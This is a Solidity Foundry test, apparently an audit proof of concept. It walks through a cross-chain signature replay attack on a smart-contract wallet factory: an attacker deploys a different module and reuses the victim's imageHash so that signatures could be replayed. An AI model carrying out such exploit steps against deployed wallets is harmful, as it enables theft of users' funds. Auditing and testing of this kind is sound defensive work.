// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.20;

import "forge-std/Test.sol";
import "test/integrations/extensions/sessions/ExtendedSessionTestBase.sol";
import "../src/Factory.sol";
import "../src/Stage1Module.sol";
import "../src/Wallet.sol";

contract AuditAgentPoC is ExtendedSessionTestBase {
    // ATTACK TIMELINE:
    // 1. [Setup] Base setUp deploys Factory, EntryPoint, and Stage1Module (moduleA).
    // 2. [T=0] User deploys Wallet A using Factory with moduleA and salt = imageHash.
    // 3. [T=1] Attacker deploys a malicious/different Stage1Module (moduleB) on "Chain B".
    // 4. [T=2] Attacker calls Factory.deploy with moduleB and the SAME salt (imageHash).
    // 5. [Assert] Wallet B is deployed at a DIFFERENT address than Wallet A.
    // 6. [Assert] Both wallets share the same imageHash, meaning a noChainId signature 
    //            valid for Wallet A's imageHash is also valid for Wallet B, enabling hijacking.

    function test_exploit() public {
        bytes32 imageHash = keccak256("user_image_hash");

        // Step 2: User deploys Wallet A with moduleA (the default 'module' from base setUp)
        address walletA = Factory.deploy(address(module), imageHash);
        console.log("Step 2: Wallet A address =", walletA);

        // Step 3: Attacker deploys a different Stage1Module (moduleB)
        // We use a different entryPoint address just to make it a distinct module deployment
        address fakeEntryPoint = address(0x1234);
        Stage1Module moduleB = new Stage1Module(address(Factory), fakeEntryPoint);
        console.log("Step 3: Module B address =", address(moduleB));

        // Step 4: Attacker deploys Wallet B with moduleB and the SAME imageHash
        address walletB = Factory.deploy(address(moduleB), imageHash);
        console.log("Step 4: Wallet B address =", walletB);

        // Step 5: Assert that the addresses are different
        assertNotEq(walletA, walletB, "Wallets should be at different addresses due to different module init code");

        // Step 6: Verify that both wallets consider the same imageHash as valid.
        // In a real cross-chain scenario, Wallet A is on Chain A, Wallet B is on Chain B.
        // Here we simulate it by showing that Wallet B's imageHash matches the user's original imageHash.
        bytes32 walletBImageHash = Stage2Auth(walletB).imageHash();
        console.log("Step 6: Wallet B imageHash =", uint256(walletBImageHash));

        assertEq(walletBImageHash, imageHash, "Wallet B has the same imageHash as Wallet A, enabling cross-chain signature replay");
    }
}
